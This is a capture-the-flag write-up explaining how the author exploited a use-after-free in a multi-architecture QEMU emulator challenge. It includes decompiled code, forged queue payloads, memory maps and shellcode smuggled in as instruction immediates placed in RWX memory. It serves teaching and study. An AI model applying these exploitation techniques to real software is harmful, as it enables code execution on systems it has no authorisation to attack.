## Writeup

Very very briefly:
We have a program wherein you can spawn multiple threads. 
    Each thread runs machine code in QEMU
    Each thread has several "syscalls" you can reach via making interrupts
    Each thread also uses a different architecture 
So I had to revise my ARM again. BLEHH >:(.

The threads are:
 - Link thread
    - Uses x86.
    - Manages a "link", all this is rlly is a way to read() arbitrary data via stdin 
 - Core thread 
	 - Uses Aarch64
	 - Has quite a lot of functionality.
		 - Enables storage of buffers allocated by the vault 
		 - Enables creation of those same buffers via commands sent to the vault. 
		 - Additionally allows creation of arbitrary requests which can then be handled via the vault, the core itself, or the link.
 - Vault thread
	 - Uses ARM
	 - Enables allocation and management of queues which receive commands.
	 - Also enables management and allocation of buffers.

This outlines basically all the important functionality, but there is more. Its a pretty big program.

Despite having different syscalls and architectures, all threads can use the `unity_pause` syscall. This enables threads to be paused and unpaused - a necessity as often we will need to wait. It also was a bit of an annoyance as due to some racy-ness sometimes all threads would end up paused or waiting to unpause another thread all at once. As you can imagine, quite detrimental to exploit reliability.

## The bug
I noticed there were a few things potentially buggy, but the one I ended up using was the bug in `vault_process_sq`:
```c
__int64 __fastcall vault_process_sq(process_struct *a1)
{
  unsigned __int16 v2; // [rsp+12h] [rbp-4Eh]
  unsigned __int16 free_slot; // [rsp+12h] [rbp-4Eh]
  unsigned __int16 j; // [rsp+14h] [rbp-4Ch]
  unsigned __int16 k; // [rsp+16h] [rbp-4Ah]
  unsigned __int16 v6; // [rsp+18h] [rbp-48h]
  unsigned __int16 v7; // [rsp+1Ah] [rbp-46h]
  int sz; // [rsp+1Ch] [rbp-44h]
  int v9; // [rsp+20h] [rbp-40h]
  int i; // [rsp+24h] [rbp-3Ch]
  uint64_t **p_ptr_to_important_shit; // [rsp+28h] [rbp-38h]
  char s[16]; // [rsp+30h] [rbp-30h] BYREF
  unsigned __int64 v13; // [rsp+48h] [rbp-18h]

  // ...
  
  poll_command((unsigned __int8 *)pqueue[v6][1], s);
  p_ptr_to_important_shit = &a1->devcmdptr->real_devcmd->ptr_to_important_shit;
  if ( s[0] != 0x20 )
  {
  
    // ...
    
    return 0LL;
  }
  sz = *(_DWORD *)&s[4];
  if ( *(_DWORD *)&s[4] > 0x2Fu )
  {
    if ( *(_DWORD *)&s[4] > 0x200u )
      sz = 0x200;
  }
  else
  {
    sz = 0x30;
  }
  v2 = -1;
  // [1] Search for free slot
  for ( j = 0; j <= 0x1Fu; ++j )
  {
    if ( !p_ptr_to_important_shit[2 * j + 1] )
    {
      v2 = j;
      break;
    }
  }
  // [2] We found a free slot! Allocate and send the buffer via `offer_command`
  if ( v2 != 0xFFFF )
  {
    p_ptr_to_important_shit[2 * v2 + 1] = (uint64_t *)calloc(1uLL, (unsigned int)(sz + 8));
    memset(p_ptr_to_important_shit[2 * v2 + 1], 0, (unsigned int)(sz + 8));
    LODWORD(p_ptr_to_important_shit[2 * v2]) = sz;
    if ( offer_command(
           (unsigned __int64 *)pqueue[v6][2],
           0x40u,
           v2,
           sz,
           (unsigned __int64)p_ptr_to_important_shit[2 * v2 + 1]) == -1 )
      return -1LL;
    return 0LL;
  }
  // [3] Out of space, search for one to free.
  v9 = *(_DWORD *)p_ptr_to_important_shit;
  free_slot = 0;
  for ( k = 0; k <= 0x1Fu; ++k )
  {
    if ( v9 > SLODWORD(p_ptr_to_important_shit[2 * k]) )
    {
      v9 = (int)p_ptr_to_important_shit[2 * k];
      free_slot = k;
    }
  }
  // [4] Free a slot to make space
  free(p_ptr_to_important_shit[2 * free_slot + 1]);
  p_ptr_to_important_shit[2 * free_slot + 1] = 0LL;
  if ( offer_command((unsigned __int64 *)pqueue[v6][2], 0x41u, free_slot, 0, 0LL) == -1 )
    return -1LL;
  else
    return 0LL;
}
```

When `vault_process_sq` receives the `0x20` command we will try to find a free slot in the (please ignore the variable naming) `p_ptr_to_important_shit` list [1]. If we do we allocate a buffer of suitable size, store it [2], and send it via the `0x40` command, which gets received in the core thread. If we however DONT have any free slots, we pick a slot with suitable size [3] and free it [4] -- we free slot 0 even if we **dont** find a suitable size, as you can see. 

As we can see a few lines of code before, we are sending these ptrs to the core [2], where they are stored along with their size in `core_process_cq`:
```c
  // ...
  switch ( s[0] )
  {
    case 'B':
      a1->devcmdptr->real_devcmd->sz_of_fptr = *(_DWORD *)&s[4];
      printf("Received %d bytes\n", a1->devcmdptr->real_devcmd->sz_of_fptr);
      break;
    case '@': // 0x40
      a1->devcmdptr->real_devcmd->sz_of_fptr = *(_DWORD *)&s[4];
      a1->devcmdptr->real_devcmd->ptr_to_important_shit = *(uint64_t **)&s[8];
      break;
    case 'A':
      puts("Vault memory full");
      break;
    default:
      return -1LL;
  }
  return 0LL;
  // ...
```

So what happens if the ptr we store in core is the one which gets free'd? UAF. So we spam buffer requests from the core thread -- max 8 at a time, pause, then receive them, and repeat till we release one of them until eventually the first pointer is freed - this will also be the one we store.

I ended up looking for potential ways to use this, one possible thing came to mind - both the buffer allocation and queue allocation happens inside the vault thread, so it would be trivial to allocate our buffer as a queue. I had allocated `queue[0][1] and [2]` and `queue[1][1] and [2]` at this point for using the link and communicating with the vault, but fortunately we are allowed an additional queue. So our overlapping queue/buffer becomes `queue[2][2]`. Why `[2][2]`? Because thats the queue "end" used for receiving commands by `core_process_cq`, which will be necessary for later.

The structure of a queue is pretty simple. Heres a messy snippet from my exploit:
```python
    cmdq = flat([
        p64(0x0000000100000208),
        p64(0x00001f8000000042),
        p64(0x4141414141414141),
        p64(0x0000ff8000000092),
        p64(0x4141414141414141),
        ])
```

First qword starts with 2 bytes, first the queue capacity, then the current size. Next is a 2 byte value signifying queue "position". Following that is a list of command metadata: command number as a dword, then an optional length field, also a dword. Following that is an optional pointer field. All commands in the queue follow the same structure, and there should be as many commands as specified in the size field -- in our case 2 (only rlly a problem if ur forging the queue).

So whats the plan? There is some *very* interesting code ive left unmentioned till now in `core_process_cq`:
```c
  // ...
  poll_command((unsigned __int8 *)pqueue[qidx][2], s);
  // [1]
  if ( s[0] == 0x93 )
  {
    ((void (*)(void))a1->devcmdptr->real_devcmd->ptr_to_important_shit)();
    return 0LL;
  }
  if ( s[0] > 0x93u )
    return -1LL;
  // [2]
  if ( s[0] == 0x92 )
  {
    write(1, a1->devcmdptr->real_devcmd->ptr_to_important_shit, a1->devcmdptr->real_devcmd->sz_of_fptr);
    return 0LL;
  }
  // ... Handlers for 0x40,0x41,0x43 etc...
```

[1] allows us to invoke the threads stored `ptr_to_important_shit` (again forgive the variable naming) as a function, while [2] allows us to write data from that same ptr. If you recall the handlers for 0x40-43, we are able to set these values - and now that we can control the queue, we can just pretend to send a command by writing fake queue metadata, then poll for it in `core_process_cq`. 

First point of call is leaks. This is fairly ez as the `0x42` handler allows us to change the length and NOT the stored pointer. All we need to do is set the length, then trigger the handler for command `0x92`. 

At this point it would be prudent to know what exactly we leak, so lets do that:
```
$rax+ 0x76eb9c011250|+0x0000|+000: 0x0000000000000000
      0x76eb9c011258|+0x0008|+001: 0x0000000000000000
      0x76eb9c011260|+0x0010|+002: 0x0000000000000000
      0x76eb9c011268|+0x0018|+003: 0x0000000000000000
      0x76eb9c011270|+0x0020|+004: 0x0000000000000000
      0x76eb9c011278|+0x0028|+005: 0x0000000000000000
      0x76eb9c011280|+0x0030|+006: 0x0000000000000000
      0x76eb9c011288|+0x0038|+007: 0x0000000000000000
      0x76eb9c011290|+0x0040|+008: 0x0000000000000000
      0x76eb9c011298|+0x0048|+009: 0x0000000000000000
      0x76eb9c0112a0|+0x0050|+010: 0x0000000000000000
      0x76eb9c0112a8|+0x0058|+011: 0x0000000000000000
      0x76eb9c0112b0|+0x0060|+012: 0x0000000000000000
      0x76eb9c0112b8|+0x0068|+013: 0x0000000000000000
      0x76eb9c0112c0|+0x0070|+014: 0x0000000000000000
      0x76eb9c0112c8|+0x0078|+015: 0x0000000000000000
      0x76eb9c0112d0|+0x0080|+016: 0x0000000000000000
      0x76eb9c0112d8|+0x0088|+017: 0x0000000000000035
      0x76eb9c0112e0|+0x0090|+018: 0x000076eba4000e18  ->  0x000076eba4000ec0  ->  0x428c0fdb85f05d8b
      0x76eb9c0112e8|+0x0098|+019: 0x000076eba4000e00  ->  0x00000000000010d0
      0x76eb9c0112f0|+0x00a0|+020: 0x000076eb9c0111f0  ->  0x000076eba4000b98  ->  0x000076eba4000c40  ->  ...
      0x76eb9c0112f8|+0x00a8|+021: 0x000076eb9c011330  ->  0x000076eba4000f58  ->  0x000076eba4001000  ->  ...
```
At `+0x90` is a pointer into a..... RWX region? Yes, I know WTF? Following that are some pointers to the thread stack:

```
0x000076eb5c000000 0x000076eb9bfff000 0x000000003ffff000 0x0000000000000000 rwx
0x000076eb9bfff000 0x000076eb9c000000 0x0000000000001000 0x0000000000000000 ---
0x000076eb9c000000 0x000076eb9c021000 0x0000000000021000 0x0000000000000000 rw-  <-  $rax, $rsi
0x000076eb9c021000 0x000076eba0000000 0x0000000003fdf000 0x0000000000000000 ---
0x000076eba0000000 0x000076eba0021000 0x0000000000021000 0x0000000000000000 rw-
0x000076eba0021000 0x000076eba4000000 0x0000000003fdf000 0x0000000000000000 ---
0x000076eba4000000 0x000076ebe3fff000 0x000000003ffff000 0x0000000000000000 rwx <--------
0x000076ebe3fff000 0x000076ebe4000000 0x0000000000001000 0x0000000000000000 ---
0x000076ebe4000000 0x000076ebe4021000 0x0000000000021000 0x0000000000000000 rw-
0x000076ebe4021000 0x000076ebe8000000 0x0000000003fdf000 0x0000000000000000 ---
0x000076ebe93ff000 0x000076ebe9400000 0x0000000000001000 0x0000000000000000 ---
0x000076ebe9400000 0x000076ebe9c00000 0x0000000000800000 0x0000000000000000 rw- <tls-th4><stack-th4>
0x000076ebe9c00000 0x000076ebe9c02000 0x0000000000002000 0x0000000000000000 rw-
0x000076ebe9c02000 0x000076ebe9c03000 0x0000000000001000 0x0000000000000000 ---
0x000076ebe9dff000 0x000076ebe9e00000 0x0000000000001000 0x0000000000000000 ---
0x000076ebe9e00000 0x000076ebea600000 0x0000000000800000 0x0000000000000000 rw- <tls-th3><stack-th3>
0x000076ebea600000 0x000076ebea602000 0x0000000000002000 0x0000000000000000 rw-
0x000076ebea602000 0x000076ebea603000 0x0000000000001000 0x0000000000000000 ---
0x000076ebea7ff000 0x000076ebea800000 0x0000000000001000 0x0000000000000000 ---
0x000076ebea800000 0x000076ebeb000000 0x0000000000800000 0x0000000000000000 rw- <tls-th2><stack-th2>  <-  $rsp, $rbp
0x000076ebeb000000 0x000076ebeb002000 0x0000000000002000 0x0000000000000000 rw-
0x000076ebeb002000 0x000076ebeb003000 0x0000000000001000 0x0000000000000000 ---
0x000076ebeb200000 0x000076ec2b1ff000 0x000000003ffff000 0x0000000000000000 rwx
```

With 3 threads, we have 3 rwx regions and 3 stacks. Cool. The plan now is fairly simple: If we can fake a command to set `ptr_to_important_shit` then another command to call it via `0x93`, we can do some pretty cool stuff... Potentially.

Something I noticed fairly early on by exploring the RWX regions is that we can actually embed some controlled values there. For example, heres the start of our x86 code -- this may give the game away somewhat:
```assembly
    ## binascii.hexlify((asm(\"xchg rsi,rax; xor eax,eax; pop rdx;\") + b\"\xeb\x07\")[::-1])
    mov r8, 0x07eb5ac0319648 
    mov r10, 0x4242424242424242
    ## binascii.hexlify((asm(\"shr rdx, 32; xor edi,edi;syscall\"))[::-1])
    mov r11, 0x050fff3120eac148
    mov r10, 0x4444444444444444
```
This leads to the following bit of code in the RWX segment corresponding to the x86 thread:
```asm
   0x711b2c000100:      mov    ebx,DWORD PTR [rbp-0x10]
   0x711b2c000103:      test   ebx,ebx
   0x711b2c000105:      jl     0x711b2c000228
   0x711b2c00010b:      movabs rbx,0x7eb5ac0319648
   0x711b2c000115:      mov    QWORD PTR [rbp+0x40],rbx
   0x711b2c000119:      movabs r12,0x50fff3120eac148
   0x711b2c000123:      mov    QWORD PTR [rbp+0x58],r12
   0x711b2c000127:      movabs r13,0x4444444444444444
```

Naturally the `0x4242424242424242` got eliminated cuz its pointless and gets overwritten 2 lines later. You may already know what it is we intend: Its kinda like old school abusing JIT compilation in V8: If we can embed immediates somewhere in RWX memory we can execute them like instructions, provided an arbitrary call. All thats needed at this point is to re-populate the fake queue to set these events in motion:

```python
    cmdq = flat([
        p64(0x0000000100000208),
        p64(0x00001f8000000040),
        p64(x86cont),
        p64(0x0000ff8000000093),
        ])
```

We use one of our leaks to calculate the address of where we can find our embedded shellcode, this address is `x86cont`. One more thing to cover which I found fairly interesting; I found embedding values more difficult on the ARM and AArch64 due to [fixed instruction width](https://dinfuehr.com/blog/encoding-of-immediate-values-on-aarch64/). Given our leak is in the Vault thread and our shellcode is over in the link thread, what can we do?

If we look back at the memory map from earlier, we can notice that the rwx region belongings to 2 of the threads - th3 and th4 have a fixed distance between them - no guard pages, no nothing. But the region for the first started thread th2 does have a guard between. Im pretty sure this is because the first thread's region is allocated adjacent to libc - and so there will be a region of separation there. Anywho I decided to take advantage of this by starting my link and vault threads AFTER the core thread, therefore ensuring they end up a fixed distance away from each other.

My embedded shellcode sets a read() syscall in motion which loads a stage 2 exploit - unnecessary, but I like the freedom. I ended up having to send this stage 2 twice in quick succession due to having both the main thread AND core thread trying to read from stdin at the time - so if u ever have a problem like this just spam until u get received.

A lot of the finer details can be found by reading the exploit, including my *relatively* bad assembly code. I ended up finding this challenge decently hard - mainly grappling with understanding what was going on as I hadn't reversed any binaries in quite a while. But twas only a matter of time.

Thanks for reading :).

Tags: UAF 22.04 2.34 x86_64 ARM AArch64 threads pthread RWX qemu unicorn race
